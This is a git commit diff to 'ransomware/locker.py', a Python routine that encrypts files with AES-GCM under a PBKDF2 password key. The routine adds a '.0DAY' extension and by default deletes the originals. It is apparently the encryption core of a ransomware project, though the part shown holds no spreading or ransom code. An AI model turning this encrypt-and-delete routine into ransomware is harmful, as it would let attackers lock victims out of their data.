a9bbc887516b0f61c48bd90203aae8dfc0c20455
Arunanshu Biswas <48434243+arunanshub@users.noreply.github.com>
2019-12-17 16:26:49 +0000

    Update locker.py

--- ransomware/locker.py
+++ ransomware/locker.py
@@ -1,5 +1,5 @@
-#!/usr/bin/python
-# Locker v4.0 (follows new protocol)
+#!/usr/bin/python3
+# Locker v0.4.2 (follows new protocol)
 # Implemented as function
 #
 # =============================================================================
@@ -30,75 +30,78 @@
 import hashlib
 import os
 import stat
-from struct import pack, unpack
+from struct import unpack
+from functools import partial
 
-from Cryptodome.Cipher import AES
+from pkgutil import find_loader
+
+# Compatibility with Crypto (pycryptodome)
+if find_loader('Crypto') and int(__import__('Crypto').__version__[0]) >= 3:
+    from Crypto.Cipher import AES
+else:
+    from Cryptodome.Cipher import AES
 
 
 class DecryptionError(ValueError):
     pass
 
 
-def _writer(file_path, new_file, method, flag, **kwargs):
+def _writer(file_path, new_file, method, flag, salt,
+            nonce, mac_func, block_size, metadata):
     """Facilitates reading/writing to/from file.
     This function facilitates reading from *file_path* and writing to
-    *new_file* with the provided method by looping through each line
+    *new_file* with the provided method by looping through each block
     of the file_path of fixed length, specified by *block_size*.
 
     :param file_path: File to be written on.
     :param new_file: Name of the encrypted/decrypted file to written upon.
     :param method: The way in which the file must be overwritten.
                    (encrypt or decrypt).
-    :param flag: This is to identify if the method being used is
-                 for encryption or decryption.
-                 If the *flag* is *True* then the *nonce* value
-                 is written to the end of the *new_file*.
-                 If the *flag* is *False*, then the *nonce* is written to
-                 *file_path*.
-    :param kwargs: slat, nonce, mac_func, block_size, metadata
+    :param flag: This is to identify if the method being used is for
+                 encryption or decryption.
+                 If the flag is *True*, then file is encrypted, and
+                 decrypted otherwise.
+    :param salt: Salt from the PBKDF2
+    :param metadata: Associated data to be written to the file
+    :param block_size: Reading block size, in bytes.
+    :param mac_func: bound method of AES object for calculating MAC-tag.
+    :param nonce: nonce used with the key.
     :return: None
     """
-
-    salt = kwargs['salt']
-    nonce = kwargs['nonce']
-    mac_func = kwargs['mac_func']
-    block_size = kwargs['block_size']
-    metadata = kwargs['write_metadata']
 
     meta_len = len(metadata)
 
     os.chmod(file_path, stat.S_IRWXU)
     with open(file_path, 'rb') as infile:
         with open(new_file, 'wb+') as outfile:
+            outfile_write = outfile.write
             if flag:
-
                 # Create a placeholder for writing the *mac*.
                 # and append *nonce* and *salt* before encryption.
-                # Also, add a 3 Byte metadata indicating encrypted file.
-                plh_nonce_salt = pack(f'{meta_len}s16s12s32s',
-                                      metadata,
-                                      b'0' * 16, nonce, salt)
-                outfile.write(plh_nonce_salt)
+                # Also, add a metadata indicating encrypted file.
+                plh_nonce_salt = metadata + (b'\x00' * 16) + nonce + salt
+                outfile_write(plh_nonce_salt)
 
             else:
-
                 # Moving ahead towards the encrypted data.
                 infile.seek(meta_len + 16 + 12 + 32)
 
-            # Loop through the *infile*, generate encrypted data
-            # and write it to *outfile*.
-            while True:
-                part = infile.read(block_size)
-                if not part:
-                    break
-                outfile.write(method(part))
+            # create an iterable object for getting blocks.
+            # this is a recipe from Python Cookbook.
+            blocks = iter(partial(infile.read, block_size), b'')
+            for data in blocks:
+                outfile_write(method(data))
 
+            # write mac-tag to the file.
             if flag:
                 outfile.seek(meta_len)
                 outfile.write(mac_func())
 
 
-def locker(file_path, password, remove=True, **kwargs):
+def locker(file_path, password, remove=True, method=None, new_file=None,
+           block_size=64 * 1024, ext='.0DAY', iterations=50000, dklen=32,
+           metadata=b'Encrypted-with-Pycryptor', algo='sha512', salt_len=32,
+           nonce_len=12):
     """Provides file locking/unlocking mechanism
     This function either encrypts or decrypts the file - *file_path*.
     Encryption or decryption depends upon the file's extension.
@@ -110,27 +113,41 @@ def locker(file_path, password, remove=True, **kwargs):
     :param remove: If set to True, the the file that is being
                    encrypted or decrypted will be removed.
                    (Default: True).
-    :param kwargs:
-                block_size = valid block size in int for reading files.
-                ext = extension to be appended to the files.
-                iterations = no. of iterations to derive the the key
-                             from the password.
-                dklen = length of key after PBK derivation.
-                metadata = associated metadata written to file.
+    :param algo: The PBKDF2 hashing algorithm to use.
+    :param metadata: associated metadata written to file.
+    :param dklen: length of key after PBK derivation.
+    :param iterations: no. of iterations to derive the the key from
+                       the password.
+    :param ext: extension to be appended to the files.
+    :param block_size: valid block size in int for reading files.
+    :param new_file: set new file path to be written upon.
+    :param method: set method manually (`encrypt` or `decrypt`)
+    :param nonce_len: Length of nonce to use, in bytes.
+    :param salt_len: Length of salt used in PBKDF2, in bytes.
     :return: None
     """
 
-    block_size = kwargs.get('block_size', 64 * 1024)
-    ext = kwargs.get('ext', '.0DAY')
-    iterations = kwargs.get('iterations', 50000)
-    dklen = kwargs.get('dklen', 32)
-    metadata = kwargs.get('metadata', b'Encrypted-using-Pycryptor')
+    # check for new-file's existence
+    if new_file is not None:
+        if os.path.exists(new_file):
+            if os.path.samefile(file_path, new_file):
+                raise ValueError(f'Cannot process with the same file.')
+            os.remove(new_file)
+
+    # check for method validity
+    if method is not None:
+        if method not in ['encrypt', 'decrypt']:
+            raise ValueError(f'Invalid method: `{method}`. '
+                             'Method can be "encrypt" or "decrypt" only.')
+
+    # guess the method from the extension,
+    # unless the method is explicitly specified
+    method = method or ('decrypt' if file_path.endswith(ext) else 'encrypt')
 
     # The file is being decrypted.
-    if file_path.endswith(ext):
-        method = 'decrypt'
+    if method == 'decrypt':
         flag = False
-        new_file = os.path.splitext(file_path)[0]
+        new_file = new_file or os.path.splitext(file_path)[0]
 
         # Retrieve the *nonce* and *salt*.
         with open(file_path, 'rb') as file:
@@ -140,32 +157,28 @@ def locker(file_path, password, remove=True, **kwargs):
                                    "The file might be tampered.")
 
             mac, nonce, salt = unpack('16s12s32s',
-                                      file.read(16 + 12 + 32))
+                                      file.read(16 + nonce_len + salt_len))
 
     # The file is being encrypted.
     else:
-        method = 'encrypt'
         flag = True
-        new_file = file_path + ext
-        nonce = os.urandom(12)
-        salt = os.urandom(32)
+        new_file = new_file or (file_path + ext)
+        nonce = os.urandom(nonce_len)
+        salt = os.urandom(salt_len)
         mac = None
 
-    # Create a *password_hash* and *cipher* with
-    # required method.
-    password_hash = hashlib.pbkdf2_hmac('sha512', password,
+    # Create a *password_hash* and *cipher* with required method.
+    password_hash = hashlib.pbkdf2_hmac(algo, password,
                                         salt, iterations, dklen)
-    cipher_obj = AES.new(password_hash, AES.MODE_GCM,
-                         nonce=nonce)
+    cipher_obj = AES.new(password_hash, AES.MODE_GCM, nonce=nonce)
     crp = getattr(cipher_obj.update(metadata), method)
 
     _writer(file_path, new_file,
             crp, flag,
             nonce=nonce,
             mac_func=cipher_obj.digest,
-            mac_val=mac,
             salt=salt, block_size=block_size,
-            write_metadata=metadata)
+            metadata=metadata)
 
     if not flag:
         try:
